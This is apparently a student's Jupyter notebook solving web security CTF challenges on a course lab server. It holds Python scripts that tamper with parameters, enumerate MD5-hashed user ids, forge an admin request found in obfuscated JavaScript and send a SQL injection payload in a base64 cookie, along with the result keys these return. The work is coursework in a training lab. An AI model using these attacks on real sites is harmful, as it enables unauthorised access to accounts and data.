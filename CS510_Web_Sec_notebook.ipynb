{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>User: Admin</h2><table><tr><th>Age:</th><td>43</td></tr><tr><th>Address:</th><td>12 Bolton Street, Dublin</td></tr><tr><th>Email:</th><td>administratorAccount@securityShepherd.com</td></tr><tr><th>Private Message:</th><td>Result Key: <script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>eIal5mgPZr4mdSr684/oKZmR/QWPmyacr3S9hLxEtFHHhCnw0VQ+V+IgvrKn3LwN0t2LfzAOWdI7wwa5SEbF9CNV9GMZn2uQ/3MpfzkFQEc=</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div><a></a></td></tr></table>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'username':'admin'}\n",
    "response = session.post('http://cs410.oregonctf.org/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100',data=payload)\n",
    "print(response.text)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>Hidden User's Message</h2><p>Result Key is <a>dd6301b38b5ad9c54b85d07c087aebec89df8b8c769d4da084a55663e6186742</a></p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'userId[]':'11'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'13'\n",
      "c51ce410c124a10e0db5e4b97fc2af39\n",
      "<h2 class='title'>Hidden User's Message</h2><p>Result Key is <a>1f746b87a4e3628b90b1927de23f6077abdbbb64586d3ac9485625da21921a0f</a></p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import hashlib\n",
    "import requests\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "for i in range(0,20):\n",
    "    sid = \"{}\".format(i)\n",
    "\n",
    "    s = hashlib.md5()\n",
    "    s.update(sid.encode())\n",
    "    uid = s.hexdigest()\n",
    "\n",
    "    payload = {'userId[]':uid}\n",
    "    response = session.post('http://cs410.oregonctf.org/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4',data=payload)\n",
    "    if 'Result Key' in response.text:\n",
    "        print(sid.encode())\n",
    "        print(uid)\n",
    "        print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>Server Status</h2><p>We have no idea what is wrong with the server. It just keeps saying \"Result key is;<br /><a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>BGzD4I3PVWSbrLAEBr7ZgcQBbm/ztJ7EGb4gzo0j9AMk8s1jBMjOQnO4tKvkJeMYkmDsLEWzG0k85OjxdBi5ra1EaO222tss/7EhCvnWbIo=</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a><br /> What does that even mean?!</p>\n",
      "<h2 class='title'>Server Status</h2><p>We have no idea what is wrong with the server. It just keeps saying \"Result key is;<br /><a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>BGzD4I3PVWSbrLAEBr7ZgcQBbm/ztJ7EGb4gzo0j9AMk8s1jBMjOQnO4tKvkJeMYkmDsLEWzG0k85OjxdBi5ra1EaO222tss/7EhCvnWbIo=</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a><br /> What does that even mean?!</p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'userData':'4816283'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/4a1bc73dd68f64107db3bbc7ee74e3f1336d350c4e1e51d4eda5b52dddf86c992',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Failure to Restrict URL Access Challenge 2:\n",
    "From clicking around in the inspection tool I found:\n",
    "```\n",
    "...'ajaxCall|slow|resultsDiv|function|show|hide|status|loadingSign|submitButton|fast|html|url|data|async|var|submit|false|ajax|type|POST|200|An|if|Occurred|statusText||else|Error|responseText|ismcoa98sUD8j21dmdoasmcoISOdjh3189|guestData|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa|leAdministratorFormOfAwesomeness|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin|adminData|youAreAnAdminOfAwesomenessWoopWoop|leForm'.split('|'),0,{}))\n",
    "```\n",
    "clearly I need to change guestData to adminData in the payload. And from guessing the longer random string would be the\n",
    "relative url for the post request, and \"youAreAnAdminOfAwesomenessWoopWoop\" is clearly the value for the payload. Use \n",
    "these information to craft the post request and I got the key.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<h2 class='title'>Admin Button Clicked</h2><p>Hey Admin, Here is that key you are looking for: <br /> <a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>rBYnyosPYRWJP1yHUmB7VUbi3dbpsF9PVcimE8RTthNM08pMeXMJlq7eSXQZ4bMX0kB8bP/3/6dGJweQeobZO7CWPaW6jdqc/RDMPE+bCQzWDL5EuCf+LEbDCOTYxbLU</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a><br />Enjoy!</p>\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import requests\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "payload = {'adminData':'youAreAnAdminOfAwesomenessWoopWoop'}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin',data=payload)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Failure to Restrict URL Access Challenge 3:\n",
    "I tried get a list of users and then try each one using cookie 'currentPerson=base64(username)'. I realized all users are not valid so there might be something to do with the list itself. It appears that the sql backend checks the currentUser and thus return a different list. So I had to craft a sql injection code and insert that in the cookie, and now I get a diffent list. Try all users in that list and now I got the key."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "list of users ['aGuest', 'manager', 'sean', 'root', 'administrator', 'privileged', 'seanduggan', 'markdenihan', 'mark', 'superuser', 'MrJohnReillyTheSecond', 'megauser', 'hyperuser', 'godzilla', 'kinguser', 'rootuser', 'adminuser', 'shepherd']\n",
      "aGuest\n",
      "<h2 class='title'>You're not a Super Admin!!!</h2><p>Stay away from the super admin only section. The mighty dog beasts have been released.</p>\n",
      "manager\n",
      "<!-- Invalid User Detected -->\n",
      "sean\n",
      "<!-- Invalid User Detected -->\n",
      "root\n",
      "<!-- Invalid User Detected -->\n",
      "administrator\n",
      "<!-- Invalid User Detected -->\n",
      "privileged\n",
      "<!-- Invalid User Detected -->\n",
      "seanduggan\n",
      "<!-- Invalid User Detected -->\n",
      "markdenihan\n",
      "<!-- Invalid User Detected -->\n",
      "mark\n",
      "<!-- Invalid User Detected -->\n",
      "superuser\n",
      "<!-- Invalid User Detected -->\n",
      "MrJohnReillyTheSecond\n",
      "<h2 class='title'>Super User Only Club</h2><p>Welcome super admin! Your result key is as follows <a><script>prepTooltips();prepClipboardEvents();</script><div class='input-group'><textarea id='theKey' rows=2 style='height: 30px; display: inline-block; float: left; padding-right: 1em; overflow: hidden; width:85%'>dOh+4RWeqFqt7a8KyY+8KdkWWizRV/sOKdGxe0l+ETKGEeSDEl1x5uBfzmgFQIilu7likn1zZR66xk1qgmDSm1Pn0ziUG+8FUVIllV3ESoYVL2R2d9aMIXZdvH0b0OhC3matGWAewyfz6z8Jg71ndA==</textarea><span class='input-group-button'><button class='btn' type='button' data-clipboard-shepherd data-clipboard-target='#theKey' style='height: 30px;'><img src='../js/clipboard-js/clippy.svg' width='14' alt='Copy to clipboard'></button></span><p>&nbsp;</p></div></a></p>\n",
      "megauser\n",
      "<!-- Invalid User Detected -->\n",
      "hyperuser\n",
      "<!-- Invalid User Detected -->\n",
      "godzilla\n",
      "<!-- Invalid User Detected -->\n",
      "kinguser\n",
      "<!-- Invalid User Detected -->\n",
      "rootuser\n",
      "<!-- Invalid User Detected -->\n",
      "adminuser\n",
      "<!-- Invalid User Detected -->\n",
      "shepherd\n",
      "<!-- Invalid User Detected -->\n"
     ]
    }
   ],
   "source": [
    "%reset -f\n",
    "import hashlib\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "loginpayload = {'login':'wangxin','pwd':'wangxin'}\n",
    "session = requests.Session()\n",
    "resp = session.post('http://cs410.oregonctf.org/login',data=loginpayload)\n",
    "u = b'\" or \"\"=\"' #https://www.w3schools.com/sql/sql_injection.asp\n",
    "d = base64.b64encode(u)\n",
    "my_cookie = {'currentPerson':d.decode()}\n",
    "response = session.post('http://cs410.oregonctf.org/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4UserList',cookies=my_cookie)\n",
    "userl = response.text.split('<br>')[:-1]\n",
    "print(\"list of users\", userl)\n",
    "for u in userl:\n",
    "    d = base64.b64encode(u.encode())\n",
    "    print(u)\n",
    "    my_cookie = {'currentPerson':d.decode()}\n",
    "    for i in range(10,11):\n",
    "        sid = \"{}\".format(i)\n",
    "        s = hashlib.md5()\n",
    "        s.update(sid.encode())\n",
    "        uid = s.hexdigest()\n",
    "\n",
    "        #print(userl)\n",
    "        payload = {'userId':uid,'secure':'true'}\n",
    "        response = session.post('http://cs410.oregonctf.org/challenges/e40333fc2c40b8e0169e433366350f55c77b82878329570efa894838980de5b4',data=payload,cookies=my_cookie)\n",
    "        print(response.text)\n",
    "        if 'Result Key' in response.text:\n",
    "            print(sid.encode())\n",
    "            print(uid)\n",
    "            print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
